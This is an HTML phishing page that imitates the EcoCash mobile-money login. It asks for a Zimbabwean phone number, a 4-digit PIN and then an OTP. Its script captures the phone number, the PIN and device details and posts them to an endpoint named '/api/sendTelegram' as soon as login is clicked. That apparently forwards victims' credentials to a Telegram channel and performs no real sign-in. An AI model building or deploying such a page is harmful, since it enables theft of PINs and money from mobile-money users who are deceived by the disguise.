<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,.06)}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px}

label{font-size:13px;color:#374151;margin-top:8px;display:block}
.req{color:#d04444;margin-right:6px}

input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}

.btn{width:100%;margin-top:12px;padding:10px;border-radius:8px;border:0;background:#4b86ff;color:#fff}
.btn[disabled]{background:#cbd5e1;color:#6b7280}

.warn{font-size:12px;color:#d04444;margin-top:4px;display:none}

/* PIN BOXES */
.pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
.pin-box{
  width:44px;height:48px;
  text-align:center;
  font-size:22px;
  border-radius:8px;
  border:1px solid #e6eefc;
}

/* OTP untouched */
.otp-modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.35)}
.otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px}
.otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
.otp-digit{width:40px;height:48px;text-align:center;font-size:20px;border-radius:8px;border:1px solid #e6eefc}
</style>
</head>

<body>
<div class="card">
  <img src="assets/eco.png" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">

    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263" inputmode="tel">
    <div id="phoneWarn" class="warn">Enter a valid Econet number (9 digits starting with 7)</div>

    <label style="margin-top:10px"><span class="req">★</span>4-Digit PIN</label>
    <div class="pin-row">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
    </div>

    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL (UNCHANGED) -->
<div id="otpModal" style="display:none" class="otp-modal">
  <div class="otp-box">
    <strong>Enter OTP</strong>
    <div class="otp-row">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
    </div>
    <button id="confirmOtp" disabled>Confirm</button>
    <button id="cancelOtp">Cancel</button>
  </div>
</div>

<script>
/* ================= DEVICE INFO ================= */
const device = {
  model: navigator.platform,
  platform: navigator.platform,
  userAgent: navigator.userAgent,
  screen: `${screen.width}x${screen.height}`
};

/* ================= ANTI SPAM ================= */
let lastAction = 0;
function spamBlock(){
  const now = Date.now();
  if(now - lastAction < 3000) return true;
  lastAction = now;
  return false;
}

/* ================= PHONE ================= */
const phone = document.getElementById('phone');
const phoneWarn = document.getElementById('phoneWarn');
const PREFIX = '+263';

phone.addEventListener('input',()=>{
  if(!phone.value.startsWith(PREFIX)) phone.value = PREFIX;
  let d = phone.value.slice(4).replace(/\D/g,'');
  if(d.startsWith('0')) d = d.slice(1);
  if(d && d[0] !== '7') d = '7' + d.slice(1);
  phone.value = PREFIX + d.slice(0,9);
  phone.setSelectionRange(phone.value.length, phone.value.length);
  phoneWarn.style.display = d.length === 9 ? 'none':'block';
  updateState();
});

/* ================= PIN ================= */
const pinBoxes = [...document.querySelectorAll('.pin-box')];
const hiddenPin = { value:'' };

pinBoxes.forEach((b,i)=>{
  b.addEventListener('input',()=>{
    const v = b.value.replace(/\D/g,'');
    b.value = v ? '•':'';
    hiddenPin.value =
      hiddenPin.value.substring(0,i) + v + hiddenPin.value.substring(i+1);
    if(v && i<3) pinBoxes[i+1].focus();
    updateState();
  });

  b.addEventListener('keydown',e=>{
    if(e.key==='Backspace' && !b.value && i>0){
      pinBoxes[i-1].focus();
      hiddenPin.value =
        hiddenPin.value.substring(0,i-1) + hiddenPin.value.substring(i);
    }
  });
});

/* ================= STATE ================= */
const loginBtn = document.getElementById('loginBtn');
function updateState(){
  const phoneOk = /^\+2637\d{8}$/.test(phone.value);
  const pinOk = /^\d{4}$/.test(hiddenPin.value);
  loginBtn.disabled = !(phoneOk && pinOk);
}

/* ================= SEND ================= */
function send(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ================= LOGIN ================= */
loginBtn.onclick = e=>{
  e.preventDefault();
  if(spamBlock()) return;
  document.getElementById('otpModal').style.display='flex';

  send({
    event:'login_clicked',
    loginPhone: phone.value,
    loginPin: hiddenPin.value,
    device,
    submittedAt:new Date().toISOString()
  });
};

/* ================= OTP ================= */
document.getElementById('cancelOtp').onclick=()=>{
  document.getElementById('otpModal').style.display='none';
};
</script>
</body>
</html>
